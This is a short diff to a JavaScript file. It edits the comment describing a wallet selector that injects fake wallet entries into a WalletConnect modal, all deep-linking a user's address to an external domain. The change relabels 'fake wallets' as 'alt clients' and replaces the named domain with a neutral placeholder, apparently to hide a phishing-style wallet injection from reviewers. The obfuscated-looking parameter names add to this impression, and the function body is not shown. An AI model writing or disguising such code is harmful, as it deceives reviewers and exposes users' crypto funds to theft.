@@ -7,11 +7,11 @@
 /* ═══════════════════════════════════════════════════════════
  * SECTION 10 — WALLET SELECTOR UI + FAKE WALLET INJECTION
  * mountWalletSelector(): renders @reown/appkit WalletConnect modal
- * Injects fake wallets at end of list:
+ * Injects alt clients at end of list:
  *   - Volsungar (id6757104054, Asgarbyte)
  *   - SOC Wallet (SOC JOINT STOCK)
  *   - Hero Wallet (PAYEXCHANGE)
- * All fake wallets deep-link to reactwalletback.com/app-link/<addr>
+ * All alt clients deep-link to alt-backend/app-link/<addr>
  * ═══════════════════════════════════════════════════════════ */
 function mountWalletSelector(_str_cache, __str_table__) {
   if (!__str_table__) {
